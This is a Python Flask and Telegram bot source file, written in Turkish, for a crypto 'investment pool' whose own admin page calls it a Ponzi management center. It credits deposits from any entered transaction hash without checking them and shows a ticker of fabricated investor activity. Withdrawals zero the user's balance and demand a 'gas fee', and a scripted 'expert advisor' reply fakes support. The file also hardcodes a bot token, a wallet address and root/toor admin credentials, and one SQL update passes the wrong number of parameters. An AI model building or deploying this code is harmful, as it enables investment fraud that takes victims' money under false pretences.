import os
import logging
import random
import string
import sqlite3
import datetime
import requests
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Logging ayarları
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get("TELEGRAM_TOKEN", "9101317558:AAEUpeDk9jCVgFrMm75UqKlUBePegs1C1Cs")
WEBAPP_URL = os.environ.get("WEBAPP_URL", "https://botgoldkey.onrender.com")
TRC20_WALLET = "TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH"

app = Flask(__name__)
app.secret_key = "gizli_admin_session_anahtari_kanka"

# --- VERİTABANI BAŞLANGIÇ ---
def init_db():
    conn = sqlite3.connect('bot_database.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            balance REAL DEFAULT 0.0,
            invested REAL DEFAULT 0.0,
            locked_balance REAL DEFAULT 0.0,
            vip_level INTEGER DEFAULT 1,
            has_gold_key INTEGER DEFAULT 0,
            ref_token TEXT,
            referrer_id INTEGER DEFAULT 0,
            last_bonus TEXT DEFAULT '2000-01-01 00:00:00'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keys (
            key_string TEXT PRIMARY KEY,
            owner_id INTEGER,
            uses INTEGER DEFAULT 0,
            max_uses INTEGER DEFAULT 10,
            active INTEGER DEFAULT 1
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS withdraws (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            iban TEXT,
            status TEXT DEFAULT 'Beklemede (Gas Fee Gerekli)'
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            tx_hash TEXT UNIQUE,
            amount REAL,
            status TEXT DEFAULT 'Otomatik Onaylandı'
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect('bot_database.db')
    conn.row_factory = sqlite3.Row
    return conn

# --- HTML ŞABLONLARI ---

MINI_APP_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Global Yatırım Havuzu</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: #fff; padding: 15px; text-align: center; margin: 0; }
        .card { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
        input { width: 85%; padding: 10px; border-radius: 8px; border: none; margin-top: 8px; font-size: 14px; text-align: center; background: #334155; color: white; outline: none; }
        button { background: #3b82f6; color: white; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; font-size: 14px; margin-top: 10px; font-weight: bold; width: 90%; }
        button:hover { background: #2563eb; }
        .success { color: #22c55e; margin-top: 8px; font-weight: bold; font-size: 14px; }
        .error { color: #ef4444; margin-top: 8px; font-weight: bold; font-size: 14px; }
        .warning { color: #f59e0b; font-size: 12px; margin-top: 8px; line-height: 1.3; }
        .tab-btn { background: #475569; margin: 2px; padding: 5px 4px; width: 15%; display: inline-block; font-size: 10px; cursor: pointer; border-radius: 6px; border:none; color:white;}
        .section { display: none; }
        .active-section { display: block; }
        .ticker { background: #1e293b; color: #38bdf8; font-size: 11px; padding: 6px; border-radius: 6px; margin-bottom: 10px; font-weight: bold; white-space: nowrap; overflow: hidden; }
        .lang-bar { margin-bottom: 10px; text-align: right; }
        .lang-btn { background: #334155; border: none; color: white; padding: 4px 8px; border-radius: 4px; cursor: pointer; font-size: 11px; }
        table { width: 100%; font-size: 12px; margin-top: 5px; border-collapse: collapse; }
        th, td { padding: 6px; border-bottom: 1px solid #334155; text-align: left; }
        th { color: #38bdf8; }
        .wallet-box { background: #334155; padding: 8px; border-radius: 6px; font-size: 11px; word-break: break-all; color: #38bdf8; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="lang-bar">
        <button class="lang-btn" onclick="setLang('tr')">🇹🇷 TR</button>
        <button class="lang-btn" onclick="setLang('en')">🇬🇧 EN</button>
        <button class="lang-btn" onclick="setLang('ru')">🇷🇺 RU</button>
        <button class="lang-btn" onclick="setLang('es')">🇪🇸 ES</button>
    </div>

    <h2 id="t_title">💎 Global Yatırım Havuzu</h2>
    
    <div class="ticker" id="tickerText">🔔 Ahmet Y. az önce 500 USDT otomatik yatırım yaptı!</div>

    <div>
        <button class="tab-btn" onclick="showTab('wallet')" id="t_tab1">Cüzdan</button>
        <button class="tab-btn" onclick="showTab('invest')" id="t_tab2">Paketler</button>
        <button class="tab-btn" onclick="showTab('wheel')" id="t_tab3">Çark</button>
        <button class="tab-btn" onclick="showTab('bonus')" id="t_tab4">Bonus</button>
        <button class="tab-btn" onclick="showTab('support')" id="t_tab5">Destek</button>
        <button class="tab-btn" onclick="showTab('leaderboard')" id="t_tab6">Lider</button>
    </div>

    <!-- CÜZDAN -->
    <div id="wallet" class="section active-section">
        <div class="card">
            <h3 id="t_wallet_title">Varlık Durumu</h3>
            <p><span id="t_nakit">Nakit Bakiye</span>: <span id="balance" style="font-size: 18px; font-weight: bold; color: #facc15;">0.00 TL</span></p>
            <p><span id="t_kilitli">Kilitli Anapara</span>: <span id="locked" style="font-size: 18px; font-weight: bold; color: #ef4444;">0.00 TL</span></p>
            <p>VIP Seviyesi: <span id="vipLevel" style="font-size: 18px; font-weight: bold; color: #38bdf8;">VIP 1</span></p>
            <p><span id="t_ref">Referans Linkiniz</span>: <br><input type="text" id="refLink" readonly style="font-size:11px; color:#38bdf8;"></p>
        </div>

        <div class="card">
            <h3>💎 Otomatik TRC20 Yatırım</h3>
            <p style="font-size: 11px; color: #94a3b8;">Cüzdana USDT gönderip İşlem Hash (TxID) girin:</p>
            <div class="wallet-box">TMDAC83GTrxDCQiQBCEEL11CdHBYPSMpjH</div>
            <input type="text" id="txHashInput" placeholder="TxID / İşlem Hash Kodu">
            <input type="number" id="depositAmountInput" placeholder="Yatırılan Tutar (TL / USDT)">
            <button onclick="verifyDeposit()" style="background: #10b981;">Otomatik Onayla & Bakiye Yükle</button>
            <p id="depositMsg"></p>
        </div>

        <div class="card">
            <h3 id="t_withdraw_title">Para Çekme Talebi (Şartlı & Yüksek)</h3>
            <input type="text" id="ibanInput" placeholder="USDT TRC20 Cüzdan Adresi">
            <button onclick="requestWithdraw()" style="background: #10b981;" id="t_withdraw_btn">Çekim Yap (Min 5000 TL)</button>
            <p class="warning">⚠️ Otomatik transfer için çekim limiti min 5000 TL'dir ve ağ Gas Fee (150 TL) zorunludur.</p>
            <p id="withdrawMsg"></p>
        </div>
    </div>

    <!-- PAKETLER -->
    <div id="invest" class="section">
        <div class="card" style="border: 2px solid #3b82f6;">
            <h3 id="t_pkg1_title">🚀 Bronz Paket (VIP 1)</h3>
            <p style="font-size:12px; color:#94a3b8;">Yatırım: 500 TL | Saatlik Bileşik ROI</p>
            <button onclick="investPackage(500, true)" style="background: #3b82f6;">500 TL Yatır</button>
        </div>
        <div class="card" style="border: 2px solid #8b5cf6;">
            <h3>👑 VIP Altın Paket (VIP 3)</h3>
            <p style="font-size:12px; color:#94a3b8;">Yatırım: 2500 TL | Yüksek Saatlik Getiri</p>
            <button onclick="investPackage(2500, true)" style="background: #3b82f6;">2500 TL Yatır</button>
        </div>
        <p id="investMsg" class="warning"></p>
    </div>

    <!-- ÇARK -->
    <div id="wheel" class="section">
        <div class="card">
            <h3 id="t_wheel_title">🎡 Şans Çarkı</h3>
            <p style="font-size: 12px; color: #94a3b8;">50 TL ver, 3x kazanma şansını dene!</p>
            <button onclick="spinWheel()" style="background: #ef4444;" id="t_wheel_btn">Çarkı Çevir (50 TL)</button>
            <p id="wheelMsg" style="margin-top: 10px; font-weight: bold;"></p>
        </div>
    </div>

    <!-- BONUS -->
    <div id="bonus" class="section">
        <div class="card">
            <h3 id="t_bonus_title">🎁 Günlük Dağıtım Bonusu</h3>
            <p style="font-size: 13px; color: #94a3b8;">Günde 1 defa 10 TL ödülünü al!</p>
            <button id="bonusBtn" onclick="claimBonus()" style="background: #8b5cf6;">Ödülü Topla</button>
            <p id="bonusMsg"></p>
        </div>
    </div>

    <!-- DESTEK -->
    <div id="support" class="section">
        <div class="card">
            <h3 id="t_support_title">💬 Yatırım Danışmanı Canlı Destek</h3>
            <input type="text" id="supportInput" placeholder="Mesajınızı yazın...">
            <button onclick="sendSupport()" style="background: #3b82f6;">Gönder</button>
            <p id="supportReply" style="margin-top: 12px; color: #38bdf8; font-size: 13px;"></p>
        </div>
    </div>

    <!-- LİDERLİK -->
    <div id="leaderboard" class="section">
        <div class="card">
            <h3 id="t_lead_title">🏆 Liderler Tablosu</h3>
            <table>
                <tr><th>Sıra</th><th>Kullanıcı ID</th><th>Davet</th></tr>
                <tbody id="leaderboardBody">
                    <tr><td colspan="3" style="text-align:center;">Yükleniyor...</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        const userId = tg.initDataUnsafe?.user?.id || 123456789;

        const dict = {
            tr: { title: "💎 Global Yatırım Havuzu", tab1: "Cüzdan", tab2: "Paketler", tab3: "Çark", tab4: "Bonus", tab5: "Destek", tab6: "Lider", w_title: "Varlık Durumu", nakit: "Nakit Bakiye", kilitli: "Kilitli Anapara", ref: "Referans Linkiniz", withdraw_title: "Para Çekme Talebi" },
            en: { title: "💎 Global Investment Pool", tab1: "Wallet", tab2: "Packages", tab3: "Wheel", tab4: "Bonus", tab5: "Support", tab6: "Leaders", w_title: "Asset Status", nakit: "Cash Balance", kilitli: "Locked Principal", ref: "Referral Link", withdraw_title: "Withdrawal Request" },
            ru: { title: "💎 Глобальный инвестиционный пулл", tab1: "Кошелек", tab2: "Пакеты", tab3: "Колесо", tab4: "Бонус", tab5: "Поддержка", tab6: "Лидеры", w_title: "Статус активов", nakit: "Наличный баланс", kilitli: "Заблокированный капитал", ref: "Реферальная ссылка", withdraw_title: "Запрос на вывод" },
            es: { title: "💎 Fondo de Inversión Global", tab1: "Billetera", tab2: "Paquetes", tab3: "Ruleta", tab4: "Bono", tab5: "Soporte", tab6: "Líderes", w_title: "Estado de Activos", nakit: "Efectivo", kilitli: "Principal Bloqueado", ref: "Enlace de Referido", withdraw_title: "Solicitud de Retiro" }
        };

        function setLang(lang) {
            const d = dict[lang];
            document.getElementById('t_title').innerText = d.title;
            document.getElementById('t_tab1').innerText = d.tab1;
            document.getElementById('t_tab2').innerText = d.tab2;
            document.getElementById('t_tab3').innerText = d.tab3;
            document.getElementById('t_tab4').innerText = d.tab4;
            document.getElementById('t_tab5').innerText = d.tab5;
            document.getElementById('t_tab6').innerText = d.tab6;
            document.getElementById('t_wallet_title').innerText = d.w_title;
            document.getElementById('t_nakit').innerText = d.nakit;
            document.getElementById('t_kilitli').innerText = d.kilitli;
            document.getElementById('t_ref').innerText = d.ref;
            document.getElementById('t_withdraw_title').innerText = d.withdraw_title;
        }

        const fakeTicker = [
            "🔔 Ahmet Y. az önce 500 USDT otomatik yatırım yaptı!",
            "🔥 Havuz Sigorta Fonu: 1.450.000 TL'ye ulaştı!",
            "💰 Mehmet K. yüksek çekim onayını bekliyor!"
        ];
        setInterval(() => {
            document.getElementById('tickerText').innerText = fakeTicker[Math.floor(Math.random() * fakeTicker.length)];
        }, 4000);

        function showTab(tabName) {
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active-section'));
            document.getElementById(tabName).classList.add('active-section');
            if(tabName === 'leaderboard') loadLeaderboard();
        }

        function loadData() {
            fetch(`/api/user/${userId}`).then(res => res.json()).then(data => {
                document.getElementById('balance').innerText = data.balance.toFixed(2) + " TL";
                document.getElementById('locked').innerText = data.locked.toFixed(2) + " TL";
                document.getElementById('vipLevel').innerText = "VIP " + data.vip_level;
                if(data.ref_token && data.ref_token !== "Yok") {
                    document.getElementById('refLink').value = `https://t.me/BotunKullaniciAdi_bot?start=${data.ref_token}`;
                } else {
                    document.getElementById('refLink').value = "Önce Yatırım Yapmalısın";
                }
            });
        }

        function verifyDeposit() {
            const txHash = document.getElementById('txHashInput').value.trim();
            const amount = document.getElementById('depositAmountInput').value.trim();
            const msg = document.getElementById('depositMsg');
            if(!txHash || !amount) { msg.innerText = "Tüm alanları doldurun!"; msg.className = "error"; return; }
            fetch('/api/verify-deposit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, tx_hash: txHash, amount: amount })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function investPackage(amount, insured) {
            fetch('/api/invest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, amount: amount, insured: insured })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('investMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function spinWheel() {
            fetch('/api/spin', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('wheelMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) loadData();
            });
        }

        function requestWithdraw() {
            const iban = document.getElementById('ibanInput').value.trim();
            const msg = document.getElementById('withdrawMsg');
            if(!iban) { msg.innerText = "Lütfen cüzdan girin!"; msg.className = "error"; return; }
            fetch('/api/withdraw', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, iban: iban })
            }).then(res => res.json()).then(data => {
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
            });
        }

        function claimBonus() {
            const btn = document.getElementById('bonusBtn');
            btn.disabled = true;
            fetch('/api/bonus', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId })
            }).then(res => res.json()).then(data => {
                const msg = document.getElementById('bonusMsg');
                msg.innerText = data.message;
                msg.className = data.success ? "success" : "error";
                if(data.success) {
                    loadData();
                } else {
                    btn.disabled = false;
                }
            }).catch(() => { btn.disabled = false; });
        }

        function sendSupport() {
            const txt = document.getElementById('supportInput').value.trim();
            const reply = document.getElementById('supportReply');
            if(!txt) return;
            reply.innerText = "👨‍💻 Uzman Danışman: Otomatik işlem kuyruğu aktif, talebiniz inceleniyor.";
            document.getElementById('supportInput').value = "";
        }

        function loadLeaderboard() {
            fetch('/api/leaderboard').then(res => res.json()).then(data => {
                let html = '';
                data.forEach((item, index) => {
                    html += `<tr><td>#${index+1}</td><td>${item.user_id}</td><td>${item.count} Davet</td></tr>`;
                });
                document.getElementById('leaderboardBody').innerHTML = html || '<tr><td colspan="3" style="text-align:center;">Veri yok</td></tr>';
            });
        }

        loadData();
    </script>
</body>
</html>
"""

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin Girişi</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 6px; border: none; background: #334155; color: white; }
        button { width: 100%; padding: 12px; background: #3b82f6; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .error { color: #ef4444; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="login-card">
        <h2>🔒 Admin Girişi</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        {% if error %}<p class="error">{{ error }}</p>{% endif %}
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Admin Paneli - Ponzi</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f8fafc; color: #334155; padding: 20px; }
        table { width: 100%; border-collapse: collapse; background: white; margin-top: 15px; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        th, td { padding: 12px; border-bottom: 1px solid #e2e8f0; text-align: left; }
        th { background: #0f172a; color: white; }
        h1, h2 { color: #0f172a; }
        .logout { float: right; background: #ef4444; color: white; padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: bold; }
    </style>
</head>
<body>
    <a href="/admin-logout" class="logout">Çıkış Yap</a>
    <h1>🛠️ Otomatik Ponzi Yönetim Merkezi</h1>
    <h2>Otomatik İşlenen Kripto Ödemeleri</h2>
    <table>
        <tr><th>ID</th><th>Kullanıcı ID</th><th>TxID Hash</th><th>Tutar</th><th>Durum</th></tr>
        {% for p in payments %}
        <tr><td>{{ p.id }}</td><td>{{ p.user_id }}</td><td>{{ p.tx_hash }}</td><td>{{ p.amount }} TL</td><td>{{ p.status }}</td></tr>
        {% else %}
        <tr><td colspan="5" style="text-align:center;">Ödeme yok.</td></tr>
        {% endfor %}
    </table>
</body>
</html>
"""

app = Flask(__name__)
app.secret_key = "gizli_admin_session_anahtari_kanka"

# --- FLASK ROTALARI & API'LER ---

@app.route('/')
def mini_app():
    return render_template_string(MINI_APP_HTML)

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        if request.form.get('username') == "root" and request.form.get('password') == "toor":
            session['admin_logged_in'] = True
            return redirect(url_for('admin_panel'))
        error = "Hatalı şifre!"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/admin-panel')
def admin_panel():
    if not session.get('admin_logged_in'): return redirect(url_for('admin_login'))
    conn = get_db()
    payments = conn.execute("SELECT * FROM payments").fetchall()
    conn.close()
    return render_template_string(ADMIN_HTML, payments=payments)

@app.route('/admin-logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/api/user/<int:user_id>')
def get_user_data(user_id):
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    conn.close()
    if not user:
        return jsonify({"balance": 0.0, "locked": 0.0, "vip_level": 1, "ref_token": "Yok"})
    return jsonify({"balance": user["balance"], "locked": user["locked_balance"], "vip_level": user["vip_level"], "ref_token": user["ref_token"] or "Yok"})

@app.route('/api/verify-deposit', methods=['POST'])
def verify_deposit():
    data = request.json
    user_id = int(data.get('user_id', 0))
    tx_hash = data.get('tx_hash', '').strip()
    amount = float(data.get('amount', 0))
    
    conn = get_db()
    existing_tx = conn.execute("SELECT * FROM payments WHERE tx_hash=?", (tx_hash,)).fetchone()
    if existing_tx:
        conn.close()
        return jsonify({"success": False, "message": "Bu işlem Hash kodu (TxID) daha önce kullanılmış!"})

    # Otomatik VIP Seviye Güncelleme Kademesi
    vip_lvl = 1
    if amount >= 2500: vip_lvl = 3
    elif amount >= 1000: vip_lvl = 2

    random_key = "USDT-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    conn.execute("INSERT INTO payments (user_id, tx_hash, amount, status) VALUES (?, ?, ?, 'Otomatik Onaylandı')", (user_id, tx_hash, amount))
    conn.execute("UPDATE users SET balance = balance + ?, vip_level = ?, has_gold_key = 1, ref_token = ? WHERE user_id=?", (amount, vip_lvl, random_key, user_id))
    conn.execute("INSERT OR IGNORE INTO keys (key_string, owner_id, uses, max_uses, active) VALUES (?, ?, 0, 10, 1)", (random_key, user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": f"🎉 İşlem onaylandı! {amount} TL hesabınıza eklendi, VIP {vip_lvl} oldunuz!"})

@app.route('/api/invest', methods=['POST'])
def invest():
    data = request.json
    user_id = int(data.get('user_id', 0))
    amount = float(data.get('amount', 0))
    insured = bool(data.get('insured', False))
    total_cost = amount * 1.10 if insured else amount
    
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < total_cost:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz bakiye!"})

    conn.execute("UPDATE users SET balance = balance - ?, locked_balance = locked_balance + ? WHERE user_id=?", (total_cost, amount, amount, user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": f"Tebrikler! {amount} TL yatırımınız kilitlendi. Saatlik bileşik faiz işlemeye başladı!"})

@app.route('/api/spin', methods=['POST'])
def spin():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user or user["balance"] < 50.0:
        conn.close()
        return jsonify({"success": False, "message": "Yetersiz bakiye (Min 50 TL)!"})

    conn.execute("UPDATE users SET balance = balance - 50 WHERE user_id=?", (user_id,))
    if random.choices(["lose", "win"], weights=[80, 20], k=1)[0] == "win":
        conn.execute("UPDATE users SET balance = balance + 150 WHERE user_id=?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({"success": True, "message": "🎉 Çarkıfeleği kazandın! 150 TL eklendi!"})
    else:
        conn.commit()
        conn.close()
        return jsonify({"success": False, "message": "😢 Maalesef kaybettin!"})

@app.route('/api/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    user_id = int(data.get('user_id', 0))
    iban = data.get('iban', '').strip()
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    
    # Profesyonel Şartlı Çekim Sınırı (Min 5000 TL)
    if not user or user["balance"] < 5000.0:
        conn.close()
        return jsonify({"success": False, "message": "Otomatik transfer için minimum çekim tutarı 5000 TL'dir!"})

    conn.execute("INSERT INTO withdraws (user_id, amount, iban, status) VALUES (?, ?, ?, 'Beklemede (Gas Fee Gerekli)')", (user_id, user["balance"], iban))
    conn.execute("UPDATE users SET balance = 0.0 WHERE user_id=?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": "⚠️ Çekim talebiniz alındı! Blokzincir onay ve Gas Fee (150 TL) transferi bekleniyor."})

@app.route('/api/bonus', methods=['POST'])
def bonus():
    data = request.json
    user_id = int(data.get('user_id', 0))
    conn = get_db()
    user = conn.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
    
    now = datetime.datetime.now()
    if user and user["last_bonus"]:
        last_bonus_time = datetime.datetime.strptime(user["last_bonus"], '%Y-%m-%d %H:%M:%S')
        if now - last_bonus_time < datetime.timedelta(hours=24):
            remaining = datetime.timedelta(hours=24) - (now - last_bonus_time)
            hours, remainder = divmod(int(remaining.total_seconds()), 3600)
            minutes, _ = divmod(remainder, 60)
            conn.close()
            return jsonify({"success": False, "message": f"Bugünkü ödülünüzü aldınız. Kalan: {hours}s {minutes}dk"})

    if not user:
        conn.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))

    conn.execute("UPDATE users SET balance = balance + 10, last_bonus = ? WHERE user_id=?", (now.strftime('%Y-%m-%d %H:%M:%S'), user_id))
    conn.commit()
    conn.close()
    return jsonify({"success": True, "message": "Günlük 10 TL havuz payı eklendi! 🎁"})

@app.route('/api/leaderboard')
def leaderboard():
    conn = get_db()
    res = conn.execute("SELECT owner_id as user_id, SUM(uses) as count FROM keys GROUP BY owner_id ORDER BY count DESC LIMIT 10").fetchall()
    conn.close()
    return jsonify([dict(row) for row in res])

# --- TELEGRAM BOT KOMUTLARI ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args
    conn = get_db()
    existing = conn.execute("SELECT * FROM users WHERE user_id=?", (user.id,)).fetchone()
    if not existing:
        referrer_id = 0
        if args:
            ref_code = args[0]
            key = conn.execute("SELECT * FROM keys WHERE key_string=?", (ref_code,)).fetchone()
            if key and key["active"] and key["uses"] < key["max_uses"] and key["owner_id"] != user.id:
                referrer_id = key["owner_id"]
                conn.execute("UPDATE keys SET uses = uses + 1 WHERE key_string=?", (ref_code,))
                conn.execute("UPDATE users SET balance = balance + 50 WHERE user_id=?", (user.id,))
                conn.execute("UPDATE users SET balance = balance + 100 WHERE user_id=?", (referrer_id,))

        conn.execute("INSERT INTO users (user_id, balance, invested, locked_balance, vip_level, has_gold_key, referrer_id) VALUES (?, 0.0, 0.0, 0.0, 1, 0, ?)", (user.id, referrer_id))
        conn.commit()
    conn.close()

    keyboard = [
        [InlineKeyboardButton("🚀 Mini App Aç", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton("💎 USDT Yatırım Yap", callback_data="buy_usdt")]
    ]
    await update.message.reply_text(f"Selam {user.first_name}! Otomatik Kripto Yatırım Havuzuna Hoş Geldin. 🌐", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if query.data == "buy_usdt":
        await query.message.reply_text(f"Yatırım için aşağıdaki TRC20 cüzdan adresine **USDT** gönderin:\n\n`{TRC20_WALLET}`\n\n*Ardından Mini App içinden TxID girerek bakiyenizi otomatik yükleyin!*", parse_mode="Markdown")

telegram_app = Application.builder().token(TOKEN).build()
telegram_app.add_handler(CommandHandler("start", start))
telegram_app.add_handler(CallbackQueryHandler(button_handler))

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    import asyncio
    async def process():
        update = Update.de_json(request.get_json(force=True), telegram_app.bot)
        await telegram_app.initialize()
        await telegram_app.process_update(update)
    asyncio.run(process())
    return "OK", 200

if __name__ == '__main__':
    webhook_url = f"{WEBAPP_URL}/{TOKEN}"
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}")
        logger.info(f"Webhook başarıyla tanımlandı: {webhook_url}")
    except Exception as e:
        logger.error(f"Webhook ayarlanamadı: {e}")

    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)), debug=False)
